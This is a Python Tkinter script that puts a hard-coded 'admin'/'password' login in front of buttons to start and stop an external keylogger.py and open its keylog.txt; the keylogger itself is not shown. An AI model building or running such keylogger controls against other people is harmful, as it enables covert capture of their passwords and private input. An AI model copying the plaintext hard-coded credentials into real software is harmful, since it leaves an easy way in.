import tkinter as tk
import subprocess

def authenticate():
    username = username_entry.get()
    password = password_entry.get()
    if username == "admin" and password == "password":
        result_label.config(text="Login successful")
        # switch to the main interface
        login_frame.pack_forget()
        main_frame.pack()
    else:
        result_label.config(text="Invalid username or password")

def start_keylogger():
    command = ["python", "keylogger.py"]
    subprocess.Popen(command)
    result_label.config(text="Keylogger started")

def stop_keylogger():
    subprocess.run(["pkill", "-f", "keylogger.py"])
    result_label.config(text="Keylogger stopped")

def open_log_file():
    subprocess.run(["xdg-open", "keylog.txt"])

# Create a GUI window
root = tk.Tk()
root.title("Login")
root.geometry("300x200")

# Create login frame
login_frame = tk.Frame(root)

username_label = tk.Label(login_frame, text="Username")
username_entry = tk.Entry(login_frame)

password_label = tk.Label(login_frame, text="Password")
password_entry = tk.Entry(login_frame, show="*")

login_button = tk.Button(login_frame, text="Login", command=authenticate)

result_label = tk.Label(login_frame, text="")

# Position login components in the frame
username_label.grid(row=0, column=0)
username_entry.grid(row=0, column=1)

password_label.grid(row=1, column=0)
password_entry.grid(row=1, column=1)

login_button.grid(row=2, columnspan=2)

result_label.grid(row=3, columnspan=2)

# Create main frame
main_frame = tk.Frame(root)

welcome_label = tk.Label(main_frame, text="Welcome to the main interface!")

start_button = tk.Button(main_frame, text="Start Keylogger", command=start_keylogger)
stop_button = tk.Button(main_frame, text="Stop Keylogger", command=stop_keylogger)
report_button = tk.Button(main_frame, text="Open Log File", command=open_log_file)

# Position main components in the frame
welcome_label.pack()
start_button.pack()
stop_button.pack()
report_button.pack()

# Position the login frame in the window
login_frame.pack()

# Start the Tkinter event loop
root.mainloop()